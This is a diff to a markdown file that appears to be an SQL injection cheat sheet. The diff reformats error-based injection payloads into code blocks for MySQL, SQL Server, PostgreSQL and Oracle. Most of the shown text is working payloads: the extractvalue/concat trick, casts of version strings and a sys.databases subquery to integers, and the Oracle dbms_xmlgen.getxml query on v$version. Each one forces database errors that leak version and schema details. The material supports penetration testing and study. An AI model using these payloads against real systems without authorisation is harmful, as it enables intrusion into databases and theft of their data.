@@ -363,6 +363,18 @@ select column_name, data_type from all_tab_columns where table_name = 'MENU';
 
 Error Base SQL Injection (SQL SERVER)
 
+Errorbase
+MySQL 
+
+```sql
+extractvalue('',concat('>',version()))
+```
+
+SQL Server 
+```sql
+cast(@@version as integer)
+```
+
 ```sql
 cast((SELECT name FROM sys.databases
 WHERE database_id = 1;) as int)
@@ -424,10 +436,15 @@ CAST((
 ) AS INT)
 ```
 
-Errorbase
-MySQL = extractvalue('',concat('>',version()))
-SQL Server = cast(@@version as integer)
-PostgreSQL = cast(version() as integer)
-Oracle = to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
+PostgreSQL 
+
+```sql
+cast(version() as integer)
+```
+
+Oracle 
+```sql
+to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
+```
 
 
